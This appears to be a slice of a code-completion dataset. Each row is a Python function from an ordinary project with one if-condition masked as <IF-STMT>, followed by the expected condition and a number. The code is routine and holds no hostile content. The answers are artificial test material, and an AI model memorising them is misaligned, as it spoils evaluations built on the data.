1995,"def __code_color(self, code):<tab>if code in self.last_dist.keys():<tab><tab><IF-STMT><tab><tab><tab>return self.screen.markup.GREEN<tab><tab>elif int(code) == 314:<tab><tab><tab>return self.screen.markup.MAGENTA<tab><tab>else:<tab><tab><tab>return self.screen.markup.RED<tab>else:<tab><tab>return """"",if int ( code ) == 0 :,97
1996,"def _calc_benchmark_stat(self, f):<tab>timer = Timer()<tab>i = 0<tab>while True:<tab><tab>f()<tab><tab>i += 1<tab><tab>if i >= self.min_run:<tab><tab><tab>_, elapsed = timer.lap()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab>return BenchmarkStat(elapsed / i, i)",if elapsed > self . min_time :,96
1997,"def _get_user_call_site():<tab>import traceback<tab>stack = traceback.extract_stack(sys._getframe())<tab>for i in range(1, len(stack)):<tab><tab>callee_path = stack[i][STACK_FILE_NAME]<tab><tab><IF-STMT><tab><tab><tab>caller_path = stack[i - 1][STACK_FILE_NAME]<tab><tab><tab>caller_lineno = stack[i - 1][STACK_LINE_NUM]<tab><tab><tab>dpark_func_name = stack[i][STACK_FUNC_NAME]<tab><tab><tab>user_call_site = ""%s:%d "" % (caller_path, caller_lineno)<tab><tab><tab>return dpark_func_name, user_call_site<tab>return ""<func>"", "" <root>""",if src_dir == os . path . dirname ( os . path . abspath ( callee_path ) ) :,196
1998,"def compact_repr(record):<tab>parts = []<tab>for key in record.__attributes__:<tab><tab>value = getattr(record, key)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if isinstance(value, list):<tab><tab><tab>value = HIDE_LIST<tab><tab>elif key == FEATS:<tab><tab><tab>value = format_feats(value)<tab><tab>else:<tab><tab><tab>value = repr(value)<tab><tab>value = capped_str(value)<tab><tab>parts.append(""%s=%s"" % (key, value))<tab>return ""%s(%s)"" % (record.__class__.__name__, "", "".join(parts))",if not value :,152
1999,"def get_tools(self, found_files):<tab>self.configured_by = {}<tab>runners = []<tab>for tool_name in self.tools_to_run:<tab><tab>tool = tools.TOOLS[tool_name]()<tab><tab>config_result = tool.configure(self, found_files)<tab><tab><IF-STMT><tab><tab><tab>configured_by = None<tab><tab><tab>messages = []<tab><tab>else:<tab><tab><tab>configured_by, messages = config_result<tab><tab><tab>if messages is None:<tab><tab><tab><tab>messages = []<tab><tab>self.configured_by[tool_name] = configured_by<tab><tab>self.messages += messages<tab><tab>runners.append(tool)<tab>return runners",if config_result is None :,172
2000,"def erase_previous(self):<tab>if self.prev:<tab><tab>length = len(self.prev)<tab><tab><IF-STMT><tab><tab><tab>length = length - 1<tab><tab>self.write("" "" * length + ""\r"")<tab><tab>self.prev = """"","if self . prev [ - 1 ] in ( ""\n"" , ""\r"" ) :",74
2001,"def __demo_mode_pause_if_active(self, tiny=False):<tab>if self.demo_mode:<tab><tab>wait_time = settings.DEFAULT_DEMO_MODE_TIMEOUT<tab><tab><IF-STMT><tab><tab><tab>wait_time = float(self.demo_sleep)<tab><tab>if not tiny:<tab><tab><tab>time.sleep(wait_time)<tab><tab>else:<tab><tab><tab>time.sleep(wait_time / 3.4)<tab>elif self.slow_mode:<tab><tab>self.__slow_mode_pause_if_active()",if self . demo_sleep :,134
2002,"def pack_remaining_length(remaining_length):<tab>s = """"<tab>while True:<tab><tab>byte = remaining_length % 128<tab><tab>remaining_length = remaining_length // 128<tab><tab># If there are more digits to encode, set the top bit of this digit<tab><tab>if remaining_length > 0:<tab><tab><tab>byte = byte | 0x80<tab><tab>s = s + struct.pack(""!B"", byte)<tab><tab><IF-STMT><tab><tab><tab>return s",if remaining_length == 0 :,115
2003,"def _get_definitions(self, schema, query):<tab>results, error = self.run_query(query, None)<tab>if error is not None:<tab><tab>raise Exception(""Failed getting schema."")<tab>results = json_loads(results)<tab>for row in results[""rows""]:<tab><tab>if row[""TABLE_SCHEMA""] != ""public"":<tab><tab><tab>table_name = ""{}.{}"".format(row[""TABLE_SCHEMA""], row[""TABLE_NAME""])<tab><tab>else:<tab><tab><tab>table_name = row[""TABLE_NAME""]<tab><tab><IF-STMT><tab><tab><tab>schema[table_name] = {""name"": table_name, ""columns"": []}<tab><tab>schema[table_name][""columns""].append(row[""COLUMN_NAME""])",if table_name not in schema :,174
2004,def _parsed_config_to_dict(config):<tab>config_dict = {}<tab>for section in config.keys():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>config_dict[section] = {}<tab><tab>for option in config[section].keys():<tab><tab><tab>config_dict[section][option] = config[section][option]<tab>return config_dict,"if section == ""DEFAULT"" :",91
2005,"def escape_string(self, value):<tab>value = EscapedString.promote(value)<tab>value = value.expanduser()<tab>result = """"<tab>for is_literal, txt in value.strings:<tab><tab>if is_literal:<tab><tab><tab>txt = pipes.quote(txt)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>txt = ""'%s'"" % txt<tab><tab>else:<tab><tab><tab>txt = txt.replace(""\\"", ""\\\\"")<tab><tab><tab>txt = txt.replace('""', '\\""')<tab><tab><tab>txt = '""%s""' % txt<tab><tab>result += txt<tab>return result","if not txt . startswith ( ""'"" ) :",139
2006,"def sendMessage(self, text, meta=None):<tab>if self.account.client is None:<tab><tab>raise locals.OfflineError<tab>for line in text.split(""\n""):<tab><tab><IF-STMT><tab><tab><tab>self.account.client.ctcpMakeQuery(self.name, [(""ACTION"", line)])<tab><tab>else:<tab><tab><tab>self.account.client.msg(self.name, line)<tab>return succeed(text)","if meta and meta . get ( ""style"" , None ) == ""emote"" :",116
2007,"def clean_email(self):<tab>email = self.cleaned_data.get(""email"")<tab>if self.instance.id:<tab><tab><IF-STMT><tab><tab><tab>if not User.objects.filter(email=self.cleaned_data.get(""email"")).exists():<tab><tab><tab><tab>return self.cleaned_data.get(""email"")<tab><tab><tab>raise forms.ValidationError(""Email already exists"")<tab><tab>else:<tab><tab><tab>return self.cleaned_data.get(""email"")<tab>else:<tab><tab>if not User.objects.filter(email=self.cleaned_data.get(""email"")).exists():<tab><tab><tab>return self.cleaned_data.get(""email"")<tab><tab>raise forms.ValidationError(""User already exists with this email"")",if self . instance . email != email :,177
2008,"def render_checks(cr, size, nchecks):<tab>""""""Render a checquerboard pattern to a cairo surface""""""<tab>cr.set_source_rgb(*gui.style.ALPHA_CHECK_COLOR_1)<tab>cr.paint()<tab>cr.set_source_rgb(*gui.style.ALPHA_CHECK_COLOR_2)<tab>for i in xrange(0, nchecks):<tab><tab>for j in xrange(0, nchecks):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>cr.rectangle(i * size, j * size, size, size)<tab><tab><tab>cr.fill()",if ( i + j ) % 2 == 0 :,155
2009,"def seek(self, timestamp, log=True):<tab>""""""Seek to a particular timestamp in the movie.""""""<tab>if self.status in [PLAYING, PAUSED]:<tab><tab>player = self._player<tab><tab><IF-STMT><tab><tab><tab>player.set_time(int(timestamp * 1000.0))<tab><tab><tab>self._vlc_clock.reset(timestamp)<tab><tab><tab>if self.status == PAUSED:<tab><tab><tab><tab>self._pause_time = timestamp<tab><tab>if log:<tab><tab><tab>logAttrib(self, log, ""seek"", timestamp)",if player and player . is_seekable ( ) :,137
2010,"def class_results_to_node(key, elements):<tab>title = attributetabletitle(key, key)<tab>ul = nodes.bullet_list("""")<tab>for element in elements:<tab><tab>ref = nodes.reference(<tab><tab><tab>"""",<tab><tab><tab>"""",<tab><tab><tab>internal=True,<tab><tab><tab>refuri=""#"" + element.fullname,<tab><tab><tab>anchorname="""",<tab><tab><tab>*[nodes.Text(element.label)]<tab><tab>)<tab><tab>para = addnodes.compact_paragraph("""", """", ref)<tab><tab><IF-STMT><tab><tab><tab>ul.append(attributetable_item("""", element.badge, para))<tab><tab>else:<tab><tab><tab>ul.append(attributetable_item("""", para))<tab>return attributetablecolumn("""", title, ul)",if element . badge is not None :,193
2011,"def parse_function(self, l):<tab>bracket = l.find(""("")<tab>fname = l[8:bracket]<tab>if self.properties:<tab><tab>if self.properties[0] == ""propget"":<tab><tab><tab>self.props[fname] = 1<tab><tab><tab>self.propget[fname] = 1<tab><tab><IF-STMT><tab><tab><tab>self.props[fname] = 1<tab><tab><tab>self.propput[fname] = 1<tab><tab>else:<tab><tab><tab>self.functions[fname] = 1<tab>self.properties = None","elif self . properties [ 0 ] == ""propput"" :",139
2012,"def _slurp_from_queue(self, task_id, accept, limit=1000, no_ack=False):<tab>with self.app.pool.acquire_channel(block=True) as (_, channel):<tab><tab>binding = self._create_binding(task_id)(channel)<tab><tab>binding.declare()<tab><tab>for _ in range(limit):<tab><tab><tab>msg = binding.get(accept=accept, no_ack=no_ack)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>yield msg<tab><tab>else:<tab><tab><tab>raise self.BacklogLimitExceeded(task_id)",if not msg :,147
2013,"def analyse_text(text):<tab>if re.search(r""^\s*model\s*\{"", text, re.M):<tab><tab>if re.search(r""^\s*data\s*\{"", text, re.M):<tab><tab><tab>return 0.9<tab><tab><IF-STMT><tab><tab><tab>return 0.9<tab><tab>else:<tab><tab><tab>return 0.3<tab>else:<tab><tab>return 0","elif re . search ( r""^\s*var"" , text , re . M ) :",113
2014,"def wait_for_step(self, error_buffer=None, timeout=None):<tab># TODO: this might be cleaner using channels<tab>with self.cv:<tab><tab>start = time.time()<tab><tab>while True:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab><tab><tab>elif timeout is not None and time.time() - start > timeout:<tab><tab><tab><tab>raise error.Error(""No rewards received in {}s"".format(timeout))<tab><tab><tab>if error_buffer:<tab><tab><tab><tab>error_buffer.check()<tab><tab><tab>self.cv.wait(timeout=0.5)",if self . count != 0 :,146
2015,"def TestDictAgainst(dict, check):<tab>for key, value in check.iteritems():<tab><tab><IF-STMT><tab><tab><tab>raise error(<tab><tab><tab><tab>""Indexing for '%s' gave the incorrect value - %s/%s""<tab><tab><tab><tab>% (repr(key), repr(dict[key]), repr(check[key]))<tab><tab><tab>)",if dict ( key ) != value :,90
2016,"def callback(username, password, msg):<tab>self.add_channel()<tab>if hasattr(self, ""_closed"") and not self._closed:<tab><tab>self.attempted_logins += 1<tab><tab><IF-STMT><tab><tab><tab>msg += "" Disconnecting.""<tab><tab><tab>self.respond(""530 "" + msg)<tab><tab><tab>self.close_when_done()<tab><tab>else:<tab><tab><tab>self.respond(""530 "" + msg)<tab><tab>self.log(""USER '%s' failed login."" % username)<tab>self.on_login_failed(username, password)",if self . attempted_logins >= self . max_login_attempts :,150
2017,"def handle_disconnect(self):<tab>""""""Socket gets disconnected""""""<tab># signal disconnected terminal with control lines<tab>try:<tab><tab>self.serial.rts = False<tab><tab>self.serial.dtr = False<tab>finally:<tab><tab># restore original port configuration in case it was changed<tab><tab>self.serial.apply_settings(self.serial_settings_backup)<tab><tab># stop RFC 2217 state machine<tab><tab>self.rfc2217 = None<tab><tab># clear send buffer<tab><tab>self.buffer_ser2net = bytearray()<tab><tab># close network connection<tab><tab><IF-STMT><tab><tab><tab>self.socket.close()<tab><tab><tab>self.socket = None<tab><tab><tab>if self.log is not None:<tab><tab><tab><tab>self.log.warning(""{}: Disconnected"".format(self.device))",if self . socket is not None :,195
2018,"def select_invitation_id_for_network(invitations, networkid, status=None):<tab># Get invitations based on network and maybe status<tab>invitationsfornetwork = []<tab>for invitation in invitations:<tab><tab><IF-STMT><tab><tab><tab>if status is None or invitation[""Status""] == status:<tab><tab><tab><tab>invitationsfornetwork.append(invitation[""InvitationId""])<tab>return invitationsfornetwork","if invitation [ ""NetworkSummary"" ] [ ""Id"" ] == networkid :",123
2019,"def fit(self, refstring, subpipes):<tab>if not isinstance(subpipes, list):<tab><tab>subpipes = [subpipes]<tab>for subpipe in subpipes:<tab><tab><IF-STMT><tab><tab><tab>substring = subpipe.transform(None)<tab><tab>else:<tab><tab><tab>substring = subpipe<tab><tab>self._scores.append(<tab><tab><tab>(<tab><tab><tab><tab>self.base_aligner.fit_transform(refstring, substring, get_score=True),<tab><tab><tab><tab>subpipe,<tab><tab><tab>)<tab><tab>)<tab>return self","if hasattr ( subpipe , ""transform"" ) :",149
2020,"def build_priorities(self, _iter, priorities):<tab>while _iter is not None:<tab><tab><IF-STMT><tab><tab><tab>self.build_priorities(self.files_treestore.iter_children(_iter), priorities)<tab><tab>elif not self.files_treestore.get_value(_iter, 1).endswith(os.path.sep):<tab><tab><tab>priorities[<tab><tab><tab><tab>self.files_treestore.get_value(_iter, 3)<tab><tab><tab>] = self.files_treestore.get_value(_iter, 0)<tab><tab>_iter = self.files_treestore.iter_next(_iter)<tab>return priorities",if self . files_treestore . iter_has_child ( _iter ) :,170
2021,"def __init__(self, fileobj, info):<tab>pages = []<tab>complete = False<tab>while not complete:<tab><tab>page = OggPage(fileobj)<tab><tab><IF-STMT><tab><tab><tab>pages.append(page)<tab><tab><tab>complete = page.complete or (len(page.packets) > 1)<tab>packets = OggPage.to_packets(pages)<tab>if not packets:<tab><tab>raise error(""Missing metadata packet"")<tab>data = packets[0][7:]<tab>super(OggTheoraCommentDict, self).__init__(data, framing=False)<tab>self._padding = len(data) - self._size",if page . serial == info . serial :,155
2022,"def _run_interface(self, runtime):<tab>mel_icas = []<tab>for item in self.inputs.mel_icas_in:<tab><tab><IF-STMT><tab><tab><tab>mel_icas.append(item)<tab>if len(mel_icas) == 0:<tab><tab>raise Exception(<tab><tab><tab>""%s did not find any hand_labels_noise.txt files in the following directories: %s""<tab><tab><tab>% (self.__class__.__name__, mel_icas)<tab><tab>)<tab>return runtime","if os . path . exists ( os . path . join ( item , ""hand_labels_noise.txt"" ) ) :",150
2023,"def download_file(url, file):<tab>try:<tab><tab>xlog.info(""download %s to %s"", url, file)<tab><tab>req = opener.open(url)<tab><tab>CHUNK = 16 * 1024<tab><tab>with open(file, ""wb"") as fp:<tab><tab><tab>while True:<tab><tab><tab><tab>chunk = req.read(CHUNK)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>fp.write(chunk)<tab><tab>return True<tab>except:<tab><tab>xlog.info(""download %s to %s fail"", url, file)<tab><tab>return False",if not chunk :,147
2024,"def check_sales_order_on_hold_or_close(self, ref_fieldname):<tab>for d in self.get(""items""):<tab><tab>if d.get(ref_fieldname):<tab><tab><tab>status = frappe.db.get_value(""Sales Order"", d.get(ref_fieldname), ""status"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>frappe.throw(<tab><tab><tab><tab><tab>_(""Sales Order {0} is {1}"").format(d.get(ref_fieldname), status)<tab><tab><tab><tab>)","if status in ( ""Closed"" , ""On Hold"" ) :",137
2025,"def iterstack(sources, missing, trim, pad):<tab>its = [iter(t) for t in sources]<tab>hdrs = [next(it) for it in its]<tab>hdr = hdrs[0]<tab>n = len(hdr)<tab>yield tuple(hdr)<tab>for it in its:<tab><tab>for row in it:<tab><tab><tab>outrow = tuple(row)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>outrow = outrow[:n]<tab><tab><tab>if pad and len(outrow) < n:<tab><tab><tab><tab>outrow += (missing,) * (n - len(outrow))<tab><tab><tab>yield outrow",if trim :,153
2026,"def __call__(self, response_headers):<tab>rates = get_rates_from_response_headers(response_headers)<tab>if rates:<tab><tab>time.sleep(<tab><tab><tab>self._get_wait_time(<tab><tab><tab><tab>rates.short_usage,<tab><tab><tab><tab>rates.long_usage,<tab><tab><tab><tab>get_seconds_until_next_quarter(),<tab><tab><tab><tab>get_seconds_until_next_day(),<tab><tab><tab>)<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.short_limit = rates.short_limit<tab><tab><tab>self.long_limit = rates.long_limit",if not self . force_limits :,156
2027,"def main(self):<tab>self.model.clear()<tab>self.callman.unregister_all()<tab>active_handle = self.get_active(""Place"")<tab>if active_handle:<tab><tab>active = self.dbstate.db.get_place_from_handle(active_handle)<tab><tab><IF-STMT><tab><tab><tab>self.display_place(active, None, [active_handle], DateRange())<tab><tab>else:<tab><tab><tab>self.set_has_data(False)<tab>else:<tab><tab>self.set_has_data(False)",if active :,134
2028,"def node_exists(self, jid=None, node=None, ifrom=None):<tab>with self.lock:<tab><tab>if jid is None:<tab><tab><tab>jid = self.xmpp.boundjid.full<tab><tab>if node is None:<tab><tab><tab>node = """"<tab><tab><IF-STMT><tab><tab><tab>ifrom = """"<tab><tab>if isinstance(ifrom, JID):<tab><tab><tab>ifrom = ifrom.full<tab><tab>if (jid, node, ifrom) not in self.nodes:<tab><tab><tab>return False<tab><tab>return True",if ifrom is None :,136
2029,"def append_to(project_url, destination):<tab>url = (""%smagic/%s"" % (project_url, destination)).replace(""\\"", ""/"")<tab>response = urllib2.urlopen(url)<tab>if response.getcode() == 200:<tab><tab>with open(destination, ""r"") as dest:<tab><tab><tab>lines = """".join(dest.readlines())<tab><tab><tab>content = response.read()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print_out(""IGNORED"", destination)<tab><tab><tab><tab>return<tab><tab>with open(destination, ""a"") as dest:<tab><tab><tab>dest.write(content)<tab><tab><tab>print_out(""APPEND"", destination)",if content in lines :,158
2030,"def close(self, invalidate=False):<tab>self.session.transaction = self._parent<tab>if self._parent is None:<tab><tab>for connection, transaction, autoclose in set(self._connections.values()):<tab><tab><tab>if invalidate:<tab><tab><tab><tab>connection.invalidate()<tab><tab><tab>if autoclose:<tab><tab><tab><tab>connection.close()<tab><tab><tab>else:<tab><tab><tab><tab>transaction.close()<tab>self._state = CLOSED<tab>self.session.dispatch.after_transaction_end(self.session, self)<tab>if self._parent is None:<tab><tab><IF-STMT><tab><tab><tab>self.session.begin()<tab>self.session = None<tab>self._connections = None",if not self . session . autocommit :,172
2031,"def list_local_packages(path):<tab>""""""Lists all local packages below a path that could be installed.""""""<tab>rv = []<tab>try:<tab><tab>for filename in os.listdir(path):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>rv.append(""@"" + filename)<tab>except OSError:<tab><tab>pass<tab>return rv","if os . path . isfile ( os . path . join ( path , filename , ""setup.py"" ) ) :",98
2032,"def walk_dir(templates, dest, filter=None):<tab>l = []<tab>for root, folders, files in os.walk(templates):<tab><tab>for filename in files:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>relative_dir = "".{0}"".format(<tab><tab><tab><tab>os.path.split(os.path.join(root, filename).replace(templates, """"))[0]<tab><tab><tab>)<tab><tab><tab>l.append((os.path.join(root, filename), os.path.join(dest, relative_dir)))<tab>return l","if filename . endswith ( "".pyc"" ) or ( filter and filename not in filter ) :",150
2033,"def selectItemHelper(self, item, scroll):<tab>if self.frame.lockout:<tab><tab>return<tab>w = self.treeWidget<tab>if item and item.IsOk():<tab><tab>self.frame.lockout = True<tab><tab>try:<tab><tab><tab>w.SelectItem(item)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>w.ScrollTo(item)<tab><tab>finally:<tab><tab><tab>self.frame.lockout = False",if scroll :,104
2034,"def validate_external(self, field):<tab>if hasattr(self, ""forum""):<tab><tab><IF-STMT><tab><tab><tab>raise ValidationError(<tab><tab><tab><tab>_(<tab><tab><tab><tab><tab>""You cannot convert a forum that ""<tab><tab><tab><tab><tab>""contains topics into an ""<tab><tab><tab><tab><tab>""external link.""<tab><tab><tab><tab>)<tab><tab><tab>)",if self . forum . topics . count ( ) > 0 :,95
2035,"def add_help(self):<tab>""Attach help functions for each of the parsed token handlers.""<tab>for attrname, func in list(shell.BQLShell.__dict__.items()):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>command_name = attrname[3:]<tab><tab>setattr(<tab><tab><tab>self.__class__,<tab><tab><tab>""help_{}"".format(command_name.lower()),<tab><tab><tab>lambda _, fun=func: print(<tab><tab><tab><tab>textwrap.dedent(fun.__doc__).strip(), file=self.outfile<tab><tab><tab>),<tab><tab>)","if attrname [ : 3 ] != ""on_"" :",141
2036,"def createFields(self):<tab>yield UInt8(self, ""tag"")<tab>yield UInt24(self, ""size"", ""Content size"")<tab>yield UInt24(self, ""timestamp"", ""Timestamp in millisecond"")<tab>yield NullBytes(self, ""reserved"", 4)<tab>size = self[""size""].value<tab>if size:<tab><tab><IF-STMT><tab><tab><tab>for field in self.parser(self, size):<tab><tab><tab><tab>yield field<tab><tab>else:<tab><tab><tab>yield RawBytes(self, ""content"", size)",if self . parser :,130
2037,"def migrate_model_field_data(Model):<tab>queryset = Model.objects.all().order_by(""pk"")<tab>for batch_pks in queryset_in_batches(queryset):<tab><tab>instances = []<tab><tab>batch = Model.objects.filter(pk__in=batch_pks)<tab><tab>for instance in batch:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>instance.content_json = parse_to_editorjs(instance.content_json)<tab><tab><tab><tab>instances.append(instance)<tab><tab>Model.objects.bulk_update(instances, [""content_json""])",if instance . content_json :,139
2038,"def _add_account(cfg, which):<tab>username = self._get_account(cfg)<tab>if (<tab><tab>username<tab><tab>and ((username == only) or only is None)<tab><tab>and cfg.auth_type == ""password""<tab>):<tab><tab><IF-STMT><tab><tab><tab>accounts[username][which] = cfg.host<tab><tab>else:<tab><tab><tab>fingerprint = self._user_fingerprint(username)<tab><tab><tab>accounts[username] = {<tab><tab><tab><tab>which: cfg.host,<tab><tab><tab><tab>""username"": username,<tab><tab><tab><tab>""policy"": self._get_policy(fingerprint),<tab><tab><tab>}<tab><tab><tab>if accounts[username][""policy""] is None:<tab><tab><tab><tab>del accounts[username][""policy""]",if username in accounts :,180
2039,"def update_msg_tags(self, msg_idx_pos, msg_info):<tab>tags = set(self.get_tags(msg_info=msg_info))<tab>with self._lock:<tab><tab>for tid in set(self.TAGS.keys()) - tags:<tab><tab><tab>self.TAGS[tid] -= set([msg_idx_pos])<tab><tab>for tid in tags:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.TAGS[tid] = set()<tab><tab><tab>self.TAGS[tid].add(msg_idx_pos)",if tid not in self . TAGS :,135
2040,"def close(self, reason=""protocol closed, reason unspecified""):<tab>if self.connection:<tab><tab>self.logger.debug(reason, self.connection.session())<tab><tab># must be first otherwise we could have a loop caused by the raise in the below<tab><tab>self.connection.close()<tab><tab>self.connection = None<tab><tab>self.peer.stats[""down""] = self.peer.stats.get(""down"", 0) + 1<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.peer.reactor.processes.down(self.peer.neighbor, reason)<tab><tab>except ProcessError:<tab><tab><tab>self.logger.debug(<tab><tab><tab><tab>""could not send notification of neighbor close to API"",<tab><tab><tab><tab>self.connection.session(),<tab><tab><tab>)","if self . peer . neighbor . api [ ""neighbor-changes"" ] :",196
2041,"def check_objects_exist(self, compare_id, raise_exc=True):<tab>for uid in convert_compare_id_to_list(compare_id):<tab><tab><IF-STMT><tab><tab><tab>if raise_exc:<tab><tab><tab><tab>raise FactCompareException(""{} not found in database"".format(uid))<tab><tab><tab>return True<tab>return False",if not self . existence_quick_check ( uid ) :,94
2042,"def on_double_click(self, event):<tab># self.save_current_folder()<tab>path = self.get_selected_path()<tab>if path:<tab><tab>kind = self.get_selected_kind()<tab><tab><IF-STMT><tab><tab><tab>self.focus_into(path)<tab><tab>else:<tab><tab><tab>self.log_frame.load_log(path)<tab>return ""break""  # avoid default action of opening the node","if kind == ""dir"" :",110
2043,"def resolve_cloudtrail_payload(self, payload):<tab>sources = self.data.get(""sources"", [])<tab>events = []<tab>for e in self.data.get(""events""):<tab><tab><IF-STMT><tab><tab><tab>events.append(e)<tab><tab><tab>event_info = CloudWatchEvents.get(e)<tab><tab><tab>if event_info is None:<tab><tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>event_info = e<tab><tab><tab>events.append(e[""event""])<tab><tab>sources.append(event_info[""source""])<tab>payload[""detail""] = {""eventSource"": list(set(sources)), ""eventName"": events}","if not isinstance ( e , dict ) :",159
2044,"def load_graph_session_from_ckpt(ckpt_path, sess_config, print_op=False):<tab>""""""load graph and session from checkpoint file""""""<tab>graph = tf.Graph()<tab>with graph.as_default():  # pylint: disable=not-context-manager<tab><tab>sess = get_session(sess_config)<tab><tab>with sess.as_default():  # pylint: disable=not-context-manager<tab><tab><tab># Load the saved meta graph and restore variables<tab><tab><tab>saver = tf.train.import_meta_graph(""{}.meta"".format(ckpt_path))<tab><tab><tab>saver.restore(sess, ckpt_path)<tab><tab><IF-STMT><tab><tab><tab>print_ops(graph, prefix=""load_graph_session_from_ckpt"")<tab>return graph, sess",if print_op :,186
2045,"def _parseConfigFile(self, iniPath, createConfig=True):<tab>parser = SafeConfigParserUnicode(strict=False)<tab>if not os.path.isfile(iniPath):<tab><tab>if createConfig:<tab><tab><tab>open(iniPath, ""w"").close()<tab><tab>else:<tab><tab><tab>return<tab>parser.readfp(codecs.open(iniPath, ""r"", ""utf_8_sig""))<tab>for section, options in list(self._iniStructure.items()):<tab><tab>if parser.has_section(section):<tab><tab><tab>for option in options:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self._config[option] = parser.get(section, option)","if parser . has_option ( section , option ) :",170
2046,"def parse(self):<tab>while 1:<tab><tab>l = self.f.readline()<tab><tab>if not l:<tab><tab><tab>return<tab><tab>l = l.strip()<tab><tab>if l.startswith(""[""):<tab><tab><tab>self.parse_uuid(l)<tab><tab><IF-STMT><tab><tab><tab>self.parse_interface(l)<tab><tab>elif l.startswith(""coclass""):<tab><tab><tab>self.parse_coclass(l)","elif l . startswith ( ""interface"" ) or l . startswith ( ""dispinterface"" ) :",117
2047,"def encode(self):<tab>if not isinstance(self.expr, m2_expr.ExprInt):<tab><tab>return False<tab>if not test_set_sf(self.parent, self.expr.size):<tab><tab>return False<tab>value = int(self.expr)<tab>if value < 1 << self.l:<tab><tab>self.parent.shift.value = 0<tab>else:<tab><tab>if value & 0xFFF:<tab><tab><tab>return False<tab><tab>value >>= 12<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>self.parent.shift.value = 1<tab>self.value = value<tab>return True",if value >= 1 << self . l :,154
2048,"def _func_runner(self):<tab>_locals.thread = self<tab>try:<tab><tab>self._final_result = self.target(*self.args, **self.kwargs)<tab><tab>self._final_exc = None<tab>except BaseException as e:<tab><tab>self._final_result = None<tab><tab>self._final_exc = e<tab><tab><IF-STMT><tab><tab><tab>log.warning(""Unexpected exception in cancelled async thread"", exc_info=True)<tab>finally:<tab><tab>self._request.set_result(None)","if not isinstance ( e , errors . CancelledError ) :",133
2049,"def _set_dialect(self, value):<tab>if value is None:<tab><tab>self._dialect = mac_eui48<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self._dialect = value<tab><tab>else:<tab><tab><tab>raise TypeError(""custom dialects should subclass mac_eui48!"")","if hasattr ( value , ""word_size"" ) and hasattr ( value , ""word_fmt"" ) :",89
2050,"def fixup_namespace_packages(path_item, parent=None):<tab>""""""Ensure that previously-declared namespace packages include path_item""""""<tab>imp.acquire_lock()<tab>try:<tab><tab>for package in _namespace_packages.get(parent, ()):<tab><tab><tab>subpath = _handle_ns(package, path_item)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>fixup_namespace_packages(subpath, package)<tab>finally:<tab><tab>imp.release_lock()",if subpath :,111
2051,"def close_file_descriptor(self, fd):<tab>""""""Attempt to close a file descriptor.""""""<tab>start_timer = time.time()<tab>error = """"<tab>while True:<tab><tab>try:<tab><tab><tab>fd.close()<tab><tab><tab>break<tab><tab>except OSError as e:<tab><tab><tab># Undoubtedly close() was called during a concurrent operation on the same file object.<tab><tab><tab>log.debug(""Error closing file descriptor: %s"" % str(e))<tab><tab><tab>time.sleep(0.5)<tab><tab><tab>current_wait_time = time.time() - start_timer<tab><tab><tab><IF-STMT><tab><tab><tab><tab>error = ""Error closing file descriptor: %s"" % str(e)<tab><tab><tab><tab>break<tab>return error",if current_wait_time >= 600 :,186
2052,"def p_constant(self, p):<tab>""""""constant : PP_NUMBER""""""<tab>value = p[1].rstrip(""LlUu"")<tab>try:<tab><tab>if value[:2] == ""0x"":<tab><tab><tab>value = int(value[2:], 16)<tab><tab><IF-STMT><tab><tab><tab>value = int(value, 8)<tab><tab>else:<tab><tab><tab>value = int(value)<tab>except ValueError:<tab><tab>value = value.rstrip(""eEfF"")<tab><tab>try:<tab><tab><tab>value = float(value)<tab><tab>except ValueError:<tab><tab><tab>value = 0<tab>p[0] = ConstantExpressionNode(value)","elif value [ 0 ] == ""0"" :",163
2053,"def set_add_delete_state(self):<tab>""Toggle the state for the help list buttons based on list entries.""<tab>if self.helplist.size() < 1:  # No entries in list.<tab><tab>self.button_helplist_edit.state((""disabled"",))<tab><tab>self.button_helplist_remove.state((""disabled"",))<tab>else:  # Some entries.<tab><tab><IF-STMT>  # There currently is a selection.<tab><tab><tab>self.button_helplist_edit.state((""!disabled"",))<tab><tab><tab>self.button_helplist_remove.state((""!disabled"",))<tab><tab>else:  # There currently is not a selection.<tab><tab><tab>self.button_helplist_edit.state((""disabled"",))<tab><tab><tab>self.button_helplist_remove.state((""disabled"",))",if self . helplist . curselection ( ) :,192
2054,def _erase_status():<tab>CodeintelHandler.status_lock.acquire()<tab>try:<tab><tab><IF-STMT><tab><tab><tab>view.erase_status(lid)<tab><tab><tab>CodeintelHandler.status_msg[lid][1] = None<tab><tab><tab>if lid in CodeintelHandler.status_lineno:<tab><tab><tab><tab>del CodeintelHandler.status_lineno[lid]<tab>finally:<tab><tab>CodeintelHandler.status_lock.release(),"if msg == CodeintelHandler . status_msg . get ( lid , [ None , None , 0 ] ) [ 1 ] :",135
